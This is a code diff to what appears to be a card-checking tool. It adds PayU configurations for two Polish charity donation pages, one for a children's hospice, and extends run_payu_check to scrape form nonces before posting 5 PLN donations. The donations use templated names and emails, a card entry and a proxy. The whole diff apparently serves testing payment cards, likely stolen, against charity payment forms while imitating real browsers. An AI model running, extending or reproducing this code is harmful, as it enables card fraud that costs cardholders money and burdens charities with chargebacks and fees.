@@ -586,6 +586,60 @@ PAYU_SITES = {
             "page-id": "10",
         },
     },
+    "fundacjapelnaciepla": {
+        "create_type": "form",
+        "create_url": "https://fundacjapelnaciepla.org/payu/payment.php",
+        "referer": "https://fundacjapelnaciepla.org/en/support-us/",
+        "origin": "https://fundacjapelnaciepla.org",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "form_fields": {
+            "amount": "5",
+            "firstname": "{first}",
+            "lastname": "{last}",
+            "email": "{email}",
+            "url": "https://fundacjapelnaciepla.org/en/thankyou/",
+            "lang": "en",
+        },
+    },
+    "pomozim": {
+        "create_type": "ajax",
+        "create_url": "https://pomozim.org.pl/wp-admin/admin-ajax.php",
+        "redirect_field": "redirect_url",
+        "nonce_field": "nonce",
+        "nonce_pattern": r'name="nonce" value="([^"]+)"',
+        "nonce_page_url": "https://pomozim.org.pl/darowizna-finansowa/",
+        "referer": "https://pomozim.org.pl/darowizna-finansowa/",
+        "origin": "https://pomozim.org.pl",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "donation_form": {
+            "currency_choice": "PLN",
+            "currency": "PLN",
+            "payment_type": "one-time",
+            "amount": "other",
+            "amount_custom": "5",
+            "first_name": "{first}",
+            "last_name": "{last}",
+            "email": "{email}",
+            "acceptance_1": "acceptance_1",
+            "acceptance_2": "acceptance_2",
+            "action": "decocode_payu_process",
+            "payment_name": "Wp\u0142ata na cele statutowe",
+            "card_token": "",
+            "continue_url": "https://pomozim.org.pl/payment/fundacje-pomoz-im-hospicjum-dla-dzieci/",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -881,7 +935,18 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                          "Sec-Fetch-User": "?1"})
             redirect = r2.headers.get("Location") or ""
         elif cfg["create_type"] == "ajax":
-            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
+            form = {}
+            for k, v in (cfg["donation_form"] or {}).items():
+                if isinstance(v, str) and ("{first}" in v or "{last}" in v or "{email}" in v):
+                    form[k] = v.format(first=first, last=last, email=email)
+                else:
+                    form[k] = v
+            if cfg.get("nonce_field"):
+                r_n = await s.get(cfg.get("nonce_page_url") or cfg["referer"], headers={"Referer": cfg["referer"]})
+                m = re.search(cfg["nonce_pattern"], r_n.text)
+                if not m:
+                    raise Exception(f"ajax: nonce '{cfg['nonce_field']}' not found")
+                form[cfg["nonce_field"]] = m.group(1)
             r = await s.post(
                 cfg["create_url"], data=form,
                 headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
